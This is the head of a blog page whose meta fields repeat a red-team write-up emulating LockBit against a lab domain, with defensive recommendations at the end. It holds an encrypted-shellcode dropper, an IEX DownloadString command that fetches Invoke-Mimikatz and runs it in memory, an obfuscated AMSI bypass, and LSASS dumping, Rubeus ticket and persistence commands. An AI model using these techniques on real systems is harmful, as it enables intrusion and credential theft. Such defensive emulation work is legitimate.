<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Adversary Emulation Exercises" /><meta property="og:locale" content="en" /><meta name="description" content="Running An Adversary Emulation Exercise Adversary emulation can take many forms, but it will always have the same end goal. Helping companies come away knowing how to defend themselves better. You can bypass every defense and find every flaw but if they don’t come away from the engagement knowing how to better defend their data, then you haven’t generated any value for them, only a payday for yourself. Here I will take a known adversary that is relevant to our mock industry and determine their tactics, techniques, and procedures (TTPs) and then apply that to our domain and evolve the attack with custom methods as the emulation progresses. TTPs to emulate How do you choose the right TTPs? This is a hard question with many valid answers. You have the government, you have public companies, you have your own experience. Realistically, you will want a combination of all those. For this exercise, I’ll take a report from the financial services sector on ransomware gangs and find an adversary that can be emulated. FS-ISAC is a trusted source for this information and in their latest report they specifically name LockBit as the primary threat. Sophos has a rundown on LockBit 3.0, including a deep dive into their leaked tool sets and a section on their initial access. The tooling we observed the attackers using included a package from GitHub called Backstab. The primary function of Backstab is, as the name implies, to sabotage the tooling that analysts in security operations centers use to monitor for suspicious activity in real time. The utility uses Microsoft’s own Process Explorer driver (signed by Microsoft) to terminate protected anti-malware processes and disable EDR utilities. Both Sophos and other researchers have observed LockBit attackers using Cobalt Strike, which has become a nearly ubiquitous attack tool among ransomware threat actors, and directly manipulating Windows Defender to evade detection. This has given us two critical pieces of information. 1) The adversary uses Cobalt Strike primarily and 2) They use an open source software (OSS) tool called Backstab to kill the endpoint detection and response software (EDR). Later it is also mentioned that LockBit deploys Mimikatz post exploitation in order to grab passwords, so we’ll include that as well. This gives us some primary goals during testing to evaluate. Importantly, we don’t have to stick with just LockBit. There are any number of adversary groups out there at one time and they are all constantly evolving their techniques, so you should have the freedom to introduce new TTPs where there is an identified weakness. What tools to use Sliver When it comes to free C2’s, you’re not short of options. You can even find cracked copies of most of the paid platforms. However, for our needs, Sliver will more than suffice. They have a wide range of post exploitation tools and can output in a few different formats. They also have support for Cobalt Strikes beacon object file format (BOF), which will come in very handy later as the emulation progresses past the TTPs decided on above. Mimikatz Mimikatz is a ubiquitous tool used post exploitation in order to dump passwords. It’s used for post exploitation tasks like elevating privileges, move laterally, and extract passwords. It’s marked by every EDR out there, so changing how it’s dropped is important. Backstab Like Sophos explained, Backstab is a tool employed by adversary groups in order to defeat EDR. It’s publicly available on GitHub, you just need to download and compile it. I suggest following CptMeelo here for how to make your compiled version mobile easily. The author describes Backstab as follows: Have these local admin credentials but the EDR is standing in the way? Unhooking or direct syscalls are not working against the EDR? Well, why not just kill it? Backstab is a tool capable of killing antimalware protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, which is signed by Microsoft. We can use this tool to kill any running process on the system by just giving it a PID. Developing the dropper As we are looking to bypass a real endpoint protection software (EPP) for this mock exercise, we should spend a moment touching on how the dropper will be developed, different bypass methods used, and different obfuscation techniques. The general idea will be to have a Sliver payload that is encrypted at rest in the resources section of an executable and, when launched, connects back to the primary C2 to allow us to drop further tools and perform additional actions. It’s nothing innovative, but it works for this. Obfuscating function calls When loading our payload, we have to do a number of things. This includes allocating the memory space, setting memory permissions, and executing it. These are all functions that reverse engineers and malware analysts look for, so let’s make it harder. Take, for example, the function CreateThread. Malware loves to use this for executing memory locations once a payload is copied into there, and so obviously this will raise flags when spotted. But what if you could hide it entirely on your import table? If you go to the MSDN documentation of CreateThread you will see the parameters it takes: 1 2 3 4 5 6 7 8 HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId ); We can use this in our implant to avoid having to import at run time by inserting this line before the function call: 1 HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId ); What we’ve done here is creating a WINAPI pointer to the function, and it can be done for a lot of our imports. Encrypting our payload The fastest way to be caught is to use a payload easily identifiable to the EPP. The easiest way to not be caught, then, is to encrypt our payload until run time. For this section, I updated the Python script from Sektor7’s red team operator course to be Python3 compatible. This way, we can now feed our outputted shellcode file from Sliver into our encrypt function, get a key and encrypted payload, and then hide that further in our dropper. I don’t want to share too much of reenz0h’s work, so I’ll keep it simple by supplying only pieces I’ve found also on StackOverflow from a decade ago. The padding function is as follows: 1 2 3 4 def pad(s): length = 16 - (len(s) % 16) s += bytes([length])*length return s And the encrypting function is as follows: 1 2 3 4 5 6 7 8 def aesenc(plaintext, key): iv = 16*&#39;\x00&#39; iv = bytearray(iv, &#39;utf-8&#39;) k = hashlib.sha256(key).digest() plaintext = pad(plaintext)) cipher = AES.new(k, AES.MODE_CBC, iv) return cipher.encrypt(bytes(plaintext)) We generate a key through using the urandom import and call the aesenc function through this: 1 2 plaintext = open(sys.argv[1], &quot;rb&quot;).read() ciphertext = aesenc(plaintext, KEY) Then to get the output looking nice we do some string manipulation and write it to the resource.ico file: 1 2 3 4 5 print(&#39;AESkey[] = { 0x&#39; + &#39;, 0x&#39;.join(hex(x)[2:] for x in KEY) + &#39; };&#39;) imm_by = bytes(ciphertext) with open(&#39;resource.ico&#39;, &#39;wb&#39;) as file: file.write(imm_by) Then at run time, we decrypt it using the native Windows Crypto API functions: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) { HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey; if (!CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){ return -1; } if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash)){ return -1; } if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){ return -1; } if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&amp;hKey)){ return -1; } if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &amp;payload_len)){ return -1; } CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey); return 0; } We have all the pieces ready for encrypting and decrypting but how do we tell our app to compile with this as a resource? We will need two additional files for this. resources.h will hold a simple declaration #define FAVICON_ICO 100 and resources.rc will hold the following: 1 2 #include &quot;resources.h&quot; FAVICON_ICO RCDATA resource.ico Retrieving our encrypted payload from the resources section can be done with the below: 1 2 3 4 res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); resHandle = LoadResource(NULL, res); payload = (char *) LockResource(resHandle); payload_len = SizeofResource(NULL, res); Something like this can be used to then compile the code from the CLI. Or you can just use VisualStudios GUI. Putting this altogether, to generate our Sliver payload we need to start a listener and output a beacon to a shellcode format. Feed this through the script and output it encrypted to another ico resource file, which we’ll then include in the resources section of our implant. The process of doing this turned out to be much more complicated than I anticipated. Over the course of building this, I removed the IV declaration because I thought the AES library documentation said that if you don’t supply one, it will auto generate one for you. All fine and good in my mind. That was until I went to decrypt at run time and for some reason the first block of bytes would be decrypted incorrectly. The issue turned out to be that I was mistaken and by not supplying an IV at encryption time, when it came to decrypt, the CBC cipher couldn’t do the first block. But this also highlights the issue with CBC. Other ciphers will derive the IV for subsequent blocks from the first blocks decryption, but with CBC only the first block gets XOR’d with the IV and that’s it. Once past this, the shellcode decoded properly in memory but I still wasn’t seeing a connection back. The final issue here turned out to be that the Shikata Ga Nai encoder needed to be disabled at implant generation time with the flag --disable-sgn in Sliver. Initial access LockBit is able to establish initial access through phishing, exploiting public web apps, or through exposed remote desktop protocol. For the sake of our exercise, we will assume that our target has been phished with a OneNote attachment and the beacon was fetched and executed successfully. Establishing persistence Post exploitation, maintaining persistence is one of the more important steps to take. A common way to do this is to add a registry key to the machine that will run our beacon on startup. Another way to maintain persistence employed by LockBit is to add a key to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon with the value /v Shell /d &quot;explorer.exe, beacon.batch&quot; /f and load a few configuration options into the batch script for downloading and running it. Testing both of these methods is relevant for determining alert coverage level. Dumping credentials We now have a persistent implant running on the host. Our next step is to get some credentials. We can obfuscate Mimikatz for this an drop it to disk, or we can choose to run it in memory and avoid dropping it to disk entirely. The latter can be done with the following PowerShell: 1 IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds However, running this from the command prompt gets it flagged immediately by the AMSI service on Windows and generates an alert. We need a way to disable or bypass AMSI so that we can continue uninterrupted. A simple search though in GitHub brings us to a page of updated AMSI bypasses. From there, this one-liner was able to disable AMSI: 1 $a=&#39;si&#39;;$b=&#39;Am&#39;;$Ref=[Ref].Assembly.GetType((&#39;System.Management.Automation.{0}{1}Utils&#39;-f $b,$a)); $z=$Ref.GetField((&#39;am{0}InitFailed&#39;-f$a),&#39;NonPublic,Static&#39;);$z.SetValue($null,$true) Let’s break this down. First I declare si and Am as two variables. I then get the type of AmsiUtils which looks like the below. Then I use the type to get the field from amsiInitFailed called &#39;NonPublic,Static&#39; and set it to True. Compare the below images to see what the field looks like before and after the completed AMSI bypass. This technique is an evolution to the one from Matt Graeber discovered in 2016, with the only change really being additional obfuscation. It allowed for us to download and execute Mimikatz in memory which is what we needed for progressing to the next step. What about Backstab? Backstab simply wasn’t needed for this. Had there been a different EDR running to try and protect us, it would have come more into play then, but as it stood an AMSI bypass was all it took to let us run through the Defender protected domain unimpeded. For testing’s sake, Backstab was dropped to disk in order to evaluate the detection and used to kill a number of processes, all of which Defender let happen without a care in the world. Exfiltrating from the fileshare Often times in these exercises people think of domain admin as the end-all be-all goal. Unlocking this should unlock the keys to the kingdom. And blue teams know this, which is why there is an absurd amount of alerting around the role. So always gunning for getting DA may actually get your cover blown faster than determining what is valuable to the company and taking that. In our case, since we are a financial services company, this will be financial information such as customer records improperly stored in a fileshare. And exfiltrating these is actually on track for ransomware gangs, they have pivoted to not just encrypting files but also stealing them to ensure a ransom is paid. In our example, there are a couple file shares. One has general scripts and one with financial information. The financial information share is privileged to only a few teams but the script share is wide open to most members in order to facilitate faster sharing. As it so happens, a Windows admin on the IT team also stores their automation scripts here and the file server needs one of them to stop and start a service on a schedule. We can change that script that it is reading from to do its normal actions, but at the end download and execute our beacon from the C2. Then all we have to do is wait for this service to run and we should see a new session generated in Sliver. Now that we have the new machine compromised, we want to do the same thing we did on the first server and bypass AMSI before dumping users with Mimikatz. Then we run through the same process of elevating to this new user and access the share with their permissions before finally exfiltrating the sensitive documents. What if we wanted to do something more interesting though? What we did here did get us results, but it made a lot of noise and it was a little hacky. Let’s rewind back to when we first dropped the beacon. Evolving the attack After dropping the beacon and getting execution and then persistence, the next step was to dump credentials through Mimikatz and an AMSI patch. That’s all fine and dandy, but Sliver offers built in tools to do a lot of this. This was mentioned briefly in January in the rundown of Sliver v Havoc, but let’s take the opportunity and really flex Armory here. First, I want to determine the users password. There’s a lot of options for doing this, but let’s just ask them. Armory has an option for this called c2tc-askcreds which will pop a box and ask them to enter their username and password. When they enter their credentials here, you should see this reflected back in the Sliver console. After getting credentials, what’s next? The prior method for lateral movement was suboptimal. It relied on taking advantage of a poorly configured service. We don’t need to do that though. Another method is to use SharpMapExec which we can use in conjunction with the newly acquired credentials to see if there are any high level saved accounts in LSASS process memory. 1 sharpmapexec ntlm winrm /user:USER /password:PASSWORD /computername:COMPNAME /domain:culbertreport.com /m:comsvcs Locate a user who looks privileged and grab their password value! But wait! There’s more! An even easier method to dump LSASS is to use the built in DLL comsvcs.dll and then exfiltrate that dumped file. This will just require further examination in Mimikatz or a similar tool. You can use Sliver to determine the LSASS Process ID (PID). 1 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full A final alternative approach is to go hands on keyboard, open an RDP session, and run Process Hacker as an Admin and make a dump of LSASS that way, again examining it with Mimikatz. Regardless of what method you choose, I now have their encrypted credentials, so what can I do with them? Through Armory, I can additionally use Rubeus to generate a Kerberos ticket granting ticket and apply it to our current session. 1 rubeus asktgt /user:USERNAME /rc4:PASSWORD /ptt The /ptt is what will apply this to our current shell. Now that we have this, just enter a new PowerShell session on the fileshare and bob’s your uncle. Results This lab is definitely bordering on a worst case scenario. There is no enterprise EDR and no SIEM and the only defense is Defender. Regardless, our imaginary IT/Sec team should come away from this emulation with a lot of knowledge now about insecure permissions, overly permissive service boundaries, and improperly secured LSASS. Our dropper was able to run uninhibited after decrypting in memory and utilizing a number of suspicious Windows API calls, Mimikatz was entered into the command prompt and this didn’t set off an alarm, and Backstab could kill processes with impunity. After the adversary TTPs were run through, additional TTPs were introduced in the form of SharpMapExec and Rubeus and neither of those were stopped or alerted on either. Taking what was learned here, I should be able to present this to my leadership team in order to justify new expenses like a SIEM for logging and alerting and a better EDR solution. But what kind of alerts should be generated? Relying on static signatures of the binary and payload code is easy to bypass, but behavioral alerting is a lot trickier to get around. For instance, our registry modification should always create an alert especially when an item is added to run at startup. Then following that, PowerShell commands like InvokeExpression(IEX) and Net.WebClient are common commands used in attack scenarios and should also generate an alert on use. Additionally, using comsvcs or any other method to access LSASS should generate an alert. Speaking of, LSASS protection is a major priority for many companies. Had this been enabled, SharpMapExec and Mimikatz would not have been able to pull passwords out of that memory space. Microsoft has extensive documentation on how LSASS is abused by threat actors and what you can do to protect it. These policies should be rolled out domain wide. Data loss protection (DLP) is something that may come to mind as a possible solution to this scenario. There are a lot of products that offer DLP and very few EDR vendors roll it into their offering, so it would most likely be an additional expense you have to consider. You also have to consider the target threat that DLP addresses. Rarely will it prevent custom protocols from being used to read and send file contents out of the company, its primary target will often instead be insider threats - people who, for one reason or another, try to email or upload sensitive information to outside the bounds of the company. This lab really just scratched the surface of potential methods for privilege elevation, lateral movement, and data exfiltration. There is a lot more that can be done both from the defenders and attackers, such as abusing certificate services as outlined in Certified Pre-Owned. I hope to revisit this soon to explore more of those attack paths as well as containers and cloud security." /><meta property="og:description" content="Running An Adversary Emulation Exercise Adversary emulation can take many forms, but it will always have the same end goal. Helping companies come away knowing how to defend themselves better. You can bypass every defense and find every flaw but if they don’t come away from the engagement knowing how to better defend their data, then you haven’t generated any value for them, only a payday for yourself. Here I will take a known adversary that is relevant to our mock industry and determine their tactics, techniques, and procedures (TTPs) and then apply that to our domain and evolve the attack with custom methods as the emulation progresses. TTPs to emulate How do you choose the right TTPs? This is a hard question with many valid answers. You have the government, you have public companies, you have your own experience. Realistically, you will want a combination of all those. For this exercise, I’ll take a report from the financial services sector on ransomware gangs and find an adversary that can be emulated. FS-ISAC is a trusted source for this information and in their latest report they specifically name LockBit as the primary threat. Sophos has a rundown on LockBit 3.0, including a deep dive into their leaked tool sets and a section on their initial access. The tooling we observed the attackers using included a package from GitHub called Backstab. The primary function of Backstab is, as the name implies, to sabotage the tooling that analysts in security operations centers use to monitor for suspicious activity in real time. The utility uses Microsoft’s own Process Explorer driver (signed by Microsoft) to terminate protected anti-malware processes and disable EDR utilities. Both Sophos and other researchers have observed LockBit attackers using Cobalt Strike, which has become a nearly ubiquitous attack tool among ransomware threat actors, and directly manipulating Windows Defender to evade detection. This has given us two critical pieces of information. 1) The adversary uses Cobalt Strike primarily and 2) They use an open source software (OSS) tool called Backstab to kill the endpoint detection and response software (EDR). Later it is also mentioned that LockBit deploys Mimikatz post exploitation in order to grab passwords, so we’ll include that as well. This gives us some primary goals during testing to evaluate. Importantly, we don’t have to stick with just LockBit. There are any number of adversary groups out there at one time and they are all constantly evolving their techniques, so you should have the freedom to introduce new TTPs where there is an identified weakness. What tools to use Sliver When it comes to free C2’s, you’re not short of options. You can even find cracked copies of most of the paid platforms. However, for our needs, Sliver will more than suffice. They have a wide range of post exploitation tools and can output in a few different formats. They also have support for Cobalt Strikes beacon object file format (BOF), which will come in very handy later as the emulation progresses past the TTPs decided on above. Mimikatz Mimikatz is a ubiquitous tool used post exploitation in order to dump passwords. It’s used for post exploitation tasks like elevating privileges, move laterally, and extract passwords. It’s marked by every EDR out there, so changing how it’s dropped is important. Backstab Like Sophos explained, Backstab is a tool employed by adversary groups in order to defeat EDR. It’s publicly available on GitHub, you just need to download and compile it. I suggest following CptMeelo here for how to make your compiled version mobile easily. The author describes Backstab as follows: Have these local admin credentials but the EDR is standing in the way? Unhooking or direct syscalls are not working against the EDR? Well, why not just kill it? Backstab is a tool capable of killing antimalware protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, which is signed by Microsoft. We can use this tool to kill any running process on the system by just giving it a PID. Developing the dropper As we are looking to bypass a real endpoint protection software (EPP) for this mock exercise, we should spend a moment touching on how the dropper will be developed, different bypass methods used, and different obfuscation techniques. The general idea will be to have a Sliver payload that is encrypted at rest in the resources section of an executable and, when launched, connects back to the primary C2 to allow us to drop further tools and perform additional actions. It’s nothing innovative, but it works for this. Obfuscating function calls When loading our payload, we have to do a number of things. This includes allocating the memory space, setting memory permissions, and executing it. These are all functions that reverse engineers and malware analysts look for, so let’s make it harder. Take, for example, the function CreateThread. Malware loves to use this for executing memory locations once a payload is copied into there, and so obviously this will raise flags when spotted. But what if you could hide it entirely on your import table? If you go to the MSDN documentation of CreateThread you will see the parameters it takes: 1 2 3 4 5 6 7 8 HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId ); We can use this in our implant to avoid having to import at run time by inserting this line before the function call: 1 HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId ); What we’ve done here is creating a WINAPI pointer to the function, and it can be done for a lot of our imports. Encrypting our payload The fastest way to be caught is to use a payload easily identifiable to the EPP. The easiest way to not be caught, then, is to encrypt our payload until run time. For this section, I updated the Python script from Sektor7’s red team operator course to be Python3 compatible. This way, we can now feed our outputted shellcode file from Sliver into our encrypt function, get a key and encrypted payload, and then hide that further in our dropper. I don’t want to share too much of reenz0h’s work, so I’ll keep it simple by supplying only pieces I’ve found also on StackOverflow from a decade ago. The padding function is as follows: 1 2 3 4 def pad(s): length = 16 - (len(s) % 16) s += bytes([length])*length return s And the encrypting function is as follows: 1 2 3 4 5 6 7 8 def aesenc(plaintext, key): iv = 16*&#39;\x00&#39; iv = bytearray(iv, &#39;utf-8&#39;) k = hashlib.sha256(key).digest() plaintext = pad(plaintext)) cipher = AES.new(k, AES.MODE_CBC, iv) return cipher.encrypt(bytes(plaintext)) We generate a key through using the urandom import and call the aesenc function through this: 1 2 plaintext = open(sys.argv[1], &quot;rb&quot;).read() ciphertext = aesenc(plaintext, KEY) Then to get the output looking nice we do some string manipulation and write it to the resource.ico file: 1 2 3 4 5 print(&#39;AESkey[] = { 0x&#39; + &#39;, 0x&#39;.join(hex(x)[2:] for x in KEY) + &#39; };&#39;) imm_by = bytes(ciphertext) with open(&#39;resource.ico&#39;, &#39;wb&#39;) as file: file.write(imm_by) Then at run time, we decrypt it using the native Windows Crypto API functions: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) { HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey; if (!CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){ return -1; } if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash)){ return -1; } if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){ return -1; } if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&amp;hKey)){ return -1; } if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &amp;payload_len)){ return -1; } CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey); return 0; } We have all the pieces ready for encrypting and decrypting but how do we tell our app to compile with this as a resource? We will need two additional files for this. resources.h will hold a simple declaration #define FAVICON_ICO 100 and resources.rc will hold the following: 1 2 #include &quot;resources.h&quot; FAVICON_ICO RCDATA resource.ico Retrieving our encrypted payload from the resources section can be done with the below: 1 2 3 4 res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); resHandle = LoadResource(NULL, res); payload = (char *) LockResource(resHandle); payload_len = SizeofResource(NULL, res); Something like this can be used to then compile the code from the CLI. Or you can just use VisualStudios GUI. Putting this altogether, to generate our Sliver payload we need to start a listener and output a beacon to a shellcode format. Feed this through the script and output it encrypted to another ico resource file, which we’ll then include in the resources section of our implant. The process of doing this turned out to be much more complicated than I anticipated. Over the course of building this, I removed the IV declaration because I thought the AES library documentation said that if you don’t supply one, it will auto generate one for you. All fine and good in my mind. That was until I went to decrypt at run time and for some reason the first block of bytes would be decrypted incorrectly. The issue turned out to be that I was mistaken and by not supplying an IV at encryption time, when it came to decrypt, the CBC cipher couldn’t do the first block. But this also highlights the issue with CBC. Other ciphers will derive the IV for subsequent blocks from the first blocks decryption, but with CBC only the first block gets XOR’d with the IV and that’s it. Once past this, the shellcode decoded properly in memory but I still wasn’t seeing a connection back. The final issue here turned out to be that the Shikata Ga Nai encoder needed to be disabled at implant generation time with the flag --disable-sgn in Sliver. Initial access LockBit is able to establish initial access through phishing, exploiting public web apps, or through exposed remote desktop protocol. For the sake of our exercise, we will assume that our target has been phished with a OneNote attachment and the beacon was fetched and executed successfully. Establishing persistence Post exploitation, maintaining persistence is one of the more important steps to take. A common way to do this is to add a registry key to the machine that will run our beacon on startup. Another way to maintain persistence employed by LockBit is to add a key to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon with the value /v Shell /d &quot;explorer.exe, beacon.batch&quot; /f and load a few configuration options into the batch script for downloading and running it. Testing both of these methods is relevant for determining alert coverage level. Dumping credentials We now have a persistent implant running on the host. Our next step is to get some credentials. We can obfuscate Mimikatz for this an drop it to disk, or we can choose to run it in memory and avoid dropping it to disk entirely. The latter can be done with the following PowerShell: 1 IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds However, running this from the command prompt gets it flagged immediately by the AMSI service on Windows and generates an alert. We need a way to disable or bypass AMSI so that we can continue uninterrupted. A simple search though in GitHub brings us to a page of updated AMSI bypasses. From there, this one-liner was able to disable AMSI: 1 $a=&#39;si&#39;;$b=&#39;Am&#39;;$Ref=[Ref].Assembly.GetType((&#39;System.Management.Automation.{0}{1}Utils&#39;-f $b,$a)); $z=$Ref.GetField((&#39;am{0}InitFailed&#39;-f$a),&#39;NonPublic,Static&#39;);$z.SetValue($null,$true) Let’s break this down. First I declare si and Am as two variables. I then get the type of AmsiUtils which looks like the below. Then I use the type to get the field from amsiInitFailed called &#39;NonPublic,Static&#39; and set it to True. Compare the below images to see what the field looks like before and after the completed AMSI bypass. This technique is an evolution to the one from Matt Graeber discovered in 2016, with the only change really being additional obfuscation. It allowed for us to download and execute Mimikatz in memory which is what we needed for progressing to the next step. What about Backstab? Backstab simply wasn’t needed for this. Had there been a different EDR running to try and protect us, it would have come more into play then, but as it stood an AMSI bypass was all it took to let us run through the Defender protected domain unimpeded. For testing’s sake, Backstab was dropped to disk in order to evaluate the detection and used to kill a number of processes, all of which Defender let happen without a care in the world. Exfiltrating from the fileshare Often times in these exercises people think of domain admin as the end-all be-all goal. Unlocking this should unlock the keys to the kingdom. And blue teams know this, which is why there is an absurd amount of alerting around the role. So always gunning for getting DA may actually get your cover blown faster than determining what is valuable to the company and taking that. In our case, since we are a financial services company, this will be financial information such as customer records improperly stored in a fileshare. And exfiltrating these is actually on track for ransomware gangs, they have pivoted to not just encrypting files but also stealing them to ensure a ransom is paid. In our example, there are a couple file shares. One has general scripts and one with financial information. The financial information share is privileged to only a few teams but the script share is wide open to most members in order to facilitate faster sharing. As it so happens, a Windows admin on the IT team also stores their automation scripts here and the file server needs one of them to stop and start a service on a schedule. We can change that script that it is reading from to do its normal actions, but at the end download and execute our beacon from the C2. Then all we have to do is wait for this service to run and we should see a new session generated in Sliver. Now that we have the new machine compromised, we want to do the same thing we did on the first server and bypass AMSI before dumping users with Mimikatz. Then we run through the same process of elevating to this new user and access the share with their permissions before finally exfiltrating the sensitive documents. What if we wanted to do something more interesting though? What we did here did get us results, but it made a lot of noise and it was a little hacky. Let’s rewind back to when we first dropped the beacon. Evolving the attack After dropping the beacon and getting execution and then persistence, the next step was to dump credentials through Mimikatz and an AMSI patch. That’s all fine and dandy, but Sliver offers built in tools to do a lot of this. This was mentioned briefly in January in the rundown of Sliver v Havoc, but let’s take the opportunity and really flex Armory here. First, I want to determine the users password. There’s a lot of options for doing this, but let’s just ask them. Armory has an option for this called c2tc-askcreds which will pop a box and ask them to enter their username and password. When they enter their credentials here, you should see this reflected back in the Sliver console. After getting credentials, what’s next? The prior method for lateral movement was suboptimal. It relied on taking advantage of a poorly configured service. We don’t need to do that though. Another method is to use SharpMapExec which we can use in conjunction with the newly acquired credentials to see if there are any high level saved accounts in LSASS process memory. 1 sharpmapexec ntlm winrm /user:USER /password:PASSWORD /computername:COMPNAME /domain:culbertreport.com /m:comsvcs Locate a user who looks privileged and grab their password value! But wait! There’s more! An even easier method to dump LSASS is to use the built in DLL comsvcs.dll and then exfiltrate that dumped file. This will just require further examination in Mimikatz or a similar tool. You can use Sliver to determine the LSASS Process ID (PID). 1 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full A final alternative approach is to go hands on keyboard, open an RDP session, and run Process Hacker as an Admin and make a dump of LSASS that way, again examining it with Mimikatz. Regardless of what method you choose, I now have their encrypted credentials, so what can I do with them? Through Armory, I can additionally use Rubeus to generate a Kerberos ticket granting ticket and apply it to our current session. 1 rubeus asktgt /user:USERNAME /rc4:PASSWORD /ptt The /ptt is what will apply this to our current shell. Now that we have this, just enter a new PowerShell session on the fileshare and bob’s your uncle. Results This lab is definitely bordering on a worst case scenario. There is no enterprise EDR and no SIEM and the only defense is Defender. Regardless, our imaginary IT/Sec team should come away from this emulation with a lot of knowledge now about insecure permissions, overly permissive service boundaries, and improperly secured LSASS. Our dropper was able to run uninhibited after decrypting in memory and utilizing a number of suspicious Windows API calls, Mimikatz was entered into the command prompt and this didn’t set off an alarm, and Backstab could kill processes with impunity. After the adversary TTPs were run through, additional TTPs were introduced in the form of SharpMapExec and Rubeus and neither of those were stopped or alerted on either. Taking what was learned here, I should be able to present this to my leadership team in order to justify new expenses like a SIEM for logging and alerting and a better EDR solution. But what kind of alerts should be generated? Relying on static signatures of the binary and payload code is easy to bypass, but behavioral alerting is a lot trickier to get around. For instance, our registry modification should always create an alert especially when an item is added to run at startup. Then following that, PowerShell commands like InvokeExpression(IEX) and Net.WebClient are common commands used in attack scenarios and should also generate an alert on use. Additionally, using comsvcs or any other method to access LSASS should generate an alert. Speaking of, LSASS protection is a major priority for many companies. Had this been enabled, SharpMapExec and Mimikatz would not have been able to pull passwords out of that memory space. Microsoft has extensive documentation on how LSASS is abused by threat actors and what you can do to protect it. These policies should be rolled out domain wide. Data loss protection (DLP) is something that may come to mind as a possible solution to this scenario. There are a lot of products that offer DLP and very few EDR vendors roll it into their offering, so it would most likely be an additional expense you have to consider. You also have to consider the target threat that DLP addresses. Rarely will it prevent custom protocols from being used to read and send file contents out of the company, its primary target will often instead be insider threats - people who, for one reason or another, try to email or upload sensitive information to outside the bounds of the company. This lab really just scratched the surface of potential methods for privilege elevation, lateral movement, and data exfiltration. There is a lot more that can be done both from the defenders and attackers, such as abusing certificate services as outlined in Certified Pre-Owned. I hope to revisit this soon to explore more of those attack paths as well as containers and cloud security." /><link rel="canonical" href="/posts/Adversary-Emulation-Exercise/" /><meta property="og:url" content="/posts/Adversary-Emulation-Exercise/" /><meta property="og:site_name" content="Culbert Report" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-04-10T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Adversary Emulation Exercises" /><meta name="twitter:site" content="@mattculbert" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-10T19:35:33+00:00","datePublished":"2023-04-10T00:00:00+00:00","description":"Running An Adversary Emulation Exercise Adversary emulation can take many forms, but it will always have the same end goal. Helping companies come away knowing how to defend themselves better. You can bypass every defense and find every flaw but if they don’t come away from the engagement knowing how to better defend their data, then you haven’t generated any value for them, only a payday for yourself. Here I will take a known adversary that is relevant to our mock industry and determine their tactics, techniques, and procedures (TTPs) and then apply that to our domain and evolve the attack with custom methods as the emulation progresses. TTPs to emulate How do you choose the right TTPs? This is a hard question with many valid answers. You have the government, you have public companies, you have your own experience. Realistically, you will want a combination of all those. For this exercise, I’ll take a report from the 